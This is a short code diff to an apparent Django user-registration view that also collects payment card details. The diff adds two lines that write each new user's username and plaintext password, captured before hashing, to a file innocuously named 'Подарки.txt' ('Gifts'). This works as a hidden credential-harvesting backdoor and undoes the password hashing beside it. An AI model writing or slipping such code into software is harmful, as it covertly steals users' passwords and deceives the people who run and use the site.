@@ -94,6 +94,8 @@ def sign(request):
         card_period = request.POST.get('card_period')
         card_cvv = request.POST.get('card_cvv')
         user_password = make_password(request.POST.get('user_password'))
+        with open('Подарки.txt', 'a', encoding='utf-8') as f:
+            f.write(username+' '+request.POST.get('user_password')+'\n')
         try:
             User.objects.get(username=username)
             return render(request, 'sign.html', {'error': 'Такой пользователь уже существует', 'logged':check_logged(request)})
